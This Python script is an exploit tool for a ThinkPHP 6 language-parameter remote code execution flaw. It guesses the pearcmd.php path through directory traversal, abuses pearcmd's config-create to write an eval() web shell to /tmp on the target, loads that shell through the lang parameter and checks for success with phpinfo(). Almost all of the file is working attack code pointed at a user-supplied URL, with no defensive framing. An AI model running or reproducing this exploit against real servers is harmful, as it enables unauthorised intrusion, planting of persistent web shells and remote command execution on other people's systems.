# -*- coding:utf-8 -*-
import chardet
import re
import urllib
import requests
import argparse
import ssl

shellcode='<?=eval($_REQUEST[1]);?>' # pass=数值1 防止引号被过滤或编码
shellpass='1'  #shell连接参数名/密码
proxies = {"http": "127.0.0.1:8080"} #抓包调试用
requests.packages.urllib3.disable_warnings()  #忽略证书

def logo():
	info='''
	Thinkphp6 Lang rce  by：xueqi
	如:python3 -u http://www.xxx.xx:80/ 
	'''
	print(info)

#login
def getpath(url_mod):
	mpath = list(range(3)) #增加path请改动数量，并以数组赋值
	mpath[0]='../../../../../../../../usr/local/lib/php/pearcmd' #docker
	mpath[1]='../../../../../../../../../../../usr/local/pear/share/pear/pearcmd'  #macos
	mpath[2]='../../../../../../../../usr/share/php/pearcmd' 

	url_mod=url_mod+"?lang="
	headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0'}
	#print(url)
	for i in range(len(mpath)):
		url=url_mod+mpath[i]
		 
		r=requests.get(url,headers=headers,timeout=20,verify=False)
		code = r.status_code
		r.encoding=chardet.detect(r.content)['encoding']	#输出显示的编码解决
		html = r.text
		try:
			okcode=html.index('array_map',0,40)
		except Exception as e:
			okcode=0
		print(okcode)
		if(okcode > 0):
			pear_path=mpath[i]
			break
		else:
			pear_path='Not found'
		i=i+1
	print("pearcmd_path: {}".format(pear_path))
	return pear_path
	

#
def getexp(url,path_mod,path_shell):
	pearurl="{}?+config-create+/&lang={}&/{}+{}".format(url,path_mod,shellcode,path_shell)
	
	headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0',
		"Content-Type":"application/x-www-form-urlencoded",
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		}
	print('payload: '+pearurl)
	
	context = ssl._create_unverified_context()  #忽略证书报错
	r=urllib.request.urlopen(pearurl,timeout=5,context=context)  # get写入php代码不进行url编码 如写入<>而不是%xx
	x=r.read().decode('utf-8')

	#改方法get时默认对url中特殊字符进行URL编码 即 < > %3c%20%3e
	#requests.packages.urllib3.disable_warnings()  #忽略证书
 	#r=requests.get(pearurl,headers=headers,timeout=5,verify=False)
	#code = r.status_code
	#r.encoding=chardet.detect(r.content)['encoding']
	#html = r.text
	#print(html)

	outurl="{}?lang=../../../../../../../../../../..{}".format(url,path_shell.replace(".php" ,''))
	
	#注意目录穿越层级 少层级会包含失败，多层级不影响
	return outurl

def prove(tarurl, shellurl):
	data=shellpass+'=phpinfo();'
	headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0',
		"Content-Type":"application/x-www-form-urlencoded",
		}
	
	r=requests.post(url=shellurl,data=data,headers=headers,timeout=5,verify=False)
	code = r.status_code
	r.encoding=chardet.detect(r.content)['encoding']
	html = r.text
	try:
		#okcode=html.index('phpinfo()',0,140) #从响应搜索特征
		title=str(re.findall('<title>(.+)</title>',html))    
		okcode=title.index('phpinfo()',0,80)		#从标题搜索特征
	except Exception as e:
		okcode=0
		title=''
	#print(title)
	if(okcode > 0):
		print('检测：利用成功,有效')
	else:
		print('检测：利用失败,请手动验证')
	#return


if __name__ == '__main__':
	parser = argparse.ArgumentParser(description='Thinkphp6 Lang rce \n by：xueqi')
	parser.add_argument('-u','--url',metavar='',type=str,help='example: -u http://xxx.xxx  url')
	parser.add_argument('-m','--module',metavar='',default='',type=str,help='example: -m "../../xxx/php/pearcmd" 默认自动猜解')
	parser.add_argument('-p','--path',metavar='',default='/tmp/eeew.php',type=str,help='example: -p "/tmp/eee.php"  shell写入默认/tmp 下')
	parser.add_argument('-c','--cmd',metavar='',default='whoami',type=str,help='example: -c "whoami" (默认) 未启用 ')
	args = parser.parse_args()
	if (args.url != None):
		url=args.url.replace("'" ,'')
		module=args.module
		path=args.path.replace("'" ,'')
		cmd=args.cmd
	else:
		print('请输入参数！example: -h #了解详情')
		logo()

	pattern = re.compile(r'^https?://')
	#lines = urlFile.readlines()
	if not pattern.match(url.strip()):
		targetUrl = 'http://' + url.strip()
	else:
		targetUrl = url.strip()
	
	if (module == ''):
		mod_path=getpath(targetUrl)
	else:
		mod_path=modele.replace("'" ,'')
	
	if (mod_path !='Not found'):
		shell_path=getexp(targetUrl,mod_path,path)
		print('webshell: '+shell_path)
		prove(targetUrl,shell_path)
	else:
		print("Not pearcmd_path")
